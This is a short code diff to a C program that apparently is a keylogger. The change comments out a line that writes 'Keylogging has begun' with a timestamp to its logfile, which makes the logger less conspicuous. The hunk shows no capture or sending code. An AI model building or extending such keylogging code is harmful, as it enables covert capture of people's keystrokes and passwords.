@@ -49,7 +49,7 @@ int main(int argc, const char *argv[]) {
     }
 
     // Output to logfile.
-    fprintf(logfile, "\n\nKeylogging has begun on %s\n", asctime(localtime(&result)));
+    // fprintf(logfile, "\n\nKeylogging has begun on %s\n", asctime(localtime(&result)));
     fflush(logfile);
 
     // Display the location of the logfile and start the loop.
